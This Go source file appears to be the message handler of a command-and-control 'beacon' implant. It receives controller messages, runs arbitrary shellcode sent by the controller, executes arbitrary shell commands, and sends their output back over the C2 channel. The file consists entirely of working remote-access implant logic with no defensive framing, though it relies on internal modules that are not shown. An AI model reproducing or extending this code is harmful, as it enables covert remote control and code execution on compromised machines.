package beacon

import (
	"bytes"
	"context"
	"fmt"
	"sync"

	"github.com/davecgh/go-spew/spew"
	"github.com/vmihailenco/msgpack/v4"

	"project/internal/convert"
	"project/internal/logger"
	"project/internal/messages"
	"project/internal/module/shell"
	"project/internal/module/shellcode"
	"project/internal/protocol"
	"project/internal/xpanic"
)

type handler struct {
	ctx *Beacon

	context context.Context
	cancel  context.CancelFunc
	wg      sync.WaitGroup
}

func newHandler(ctx *Beacon) *handler {
	h := handler{
		ctx: ctx,
	}
	h.context, h.cancel = context.WithCancel(context.Background())
	return &h
}

func (h *handler) Cancel() {
	h.cancel()
}

func (h *handler) Close() {
	h.wg.Wait()
	h.ctx = nil
}

func (h *handler) logf(lv logger.Level, format string, log ...interface{}) {
	h.ctx.logger.Printf(lv, "handler", format, log...)
}

func (h *handler) log(lv logger.Level, log ...interface{}) {
	h.ctx.logger.Println(lv, "handler", log...)
}

// logfWithInfo will print log with role GUID and message
// [2020-01-30 15:13:07] [info] <handler> foo logf
// spew output...
//
// first log interface must be *protocol.Answer
func (h *handler) logfWithInfo(lv logger.Level, format string, log ...interface{}) {
	buf := new(bytes.Buffer)
	_, _ = fmt.Fprintf(buf, format, log[1:]...)
	buf.WriteString("\n")
	spew.Fdump(buf, log[0])
	h.ctx.logger.Print(lv, "handler", buf)
}

// logWithInfo will print log with role GUID and message
// [2020-01-30 15:13:07] [info] <handler> foo log
// spew output...
//
// first log interface must be *protocol.Answer
func (h *handler) logWithInfo(lv logger.Level, log ...interface{}) {
	buf := new(bytes.Buffer)
	_, _ = fmt.Fprintln(buf, log[1:]...)
	spew.Fdump(buf, log[0])
	h.ctx.logger.Print(lv, "handler", buf)
}

// logPanic must use like defer h.logPanic("title")
func (h *handler) logPanic(title string) {
	if r := recover(); r != nil {
		h.log(logger.Fatal, xpanic.Print(r, title))
	}
}

// OnMessage is used to handle message from Controller.
// <warning> the function must be block, you can't not use
// answer *protocol.Answer in go func(), if you want to use it,
// must copy it, because answer is from sync.Pool.
func (h *handler) OnMessage(answer *protocol.Answer) {
	defer h.logPanic("handler.OnMessage")
	if len(answer.Message) < 4 {
		const log = "controller send with invalid size"
		h.logWithInfo(logger.Exploit, answer, log)
		return
	}
	msgType := convert.BytesToUint32(answer.Message[:4])
	answer.Message = answer.Message[4:]
	switch msgType {
	case messages.CMDExecuteShellCode:
		h.handleExecuteShellCode(answer)
	case messages.CMDShell:
		h.handleShell(answer)
	case messages.CMDTest:
		h.handleSendTestMessage(answer)
	default:
		const format = "controller send unknown message\ntype: 0x%08X\n%s"
		h.logf(logger.Exploit, format, msgType, spew.Sdump(answer))
	}
}

func (h *handler) handleExecuteShellCode(answer *protocol.Answer) {
	defer h.logPanic("handler.handleExecuteShellCode")
	es := new(messages.ExecuteShellCode)
	err := msgpack.Unmarshal(answer.Message, es)
	if err != nil {
		const log = "controller send invalid shellcode"
		h.logWithInfo(logger.Exploit, answer, log)
		return
	}
	go func() {
		// add interrupt to execute wg.Done
		err = shellcode.Execute(es.Method, es.ShellCode)
		if err != nil {
			// send execute error
			fmt.Println("--------------", err)
		}
	}()
}

func (h *handler) handleShell(answer *protocol.Answer) {
	defer h.logPanic("handler.handleShell")
	s := new(messages.Shell)
	err := msgpack.Unmarshal(answer.Message, s)
	if err != nil {
		const log = "controller send invalid shell"
		h.logWithInfo(logger.Exploit, answer, log)
		return
	}
	go func() {
		// add interrupt to execute wg.Done
		output, err := shell.Shell(s.Command)
		if err != nil {
			// send execute error
			return
		}

		so := messages.ShellOutput{
			Output: output,
		}
		err = h.ctx.sender.Send(h.context, messages.CMDBShellOutput, &so, true)
		if err != nil {
			fmt.Println("failed to send:", err)
		}
	}()
}

func (h *handler) handleSendTestMessage(answer *protocol.Answer) {
	defer h.logPanic("handler.handleSendTestMessage")
	err := h.ctx.Test.AddSendTestMessage(h.context, answer.Message)
	if err != nil {
		const log = "failed to add send test message\nerror:"
		h.logWithInfo(logger.Fatal, answer, log, err)
	}
}
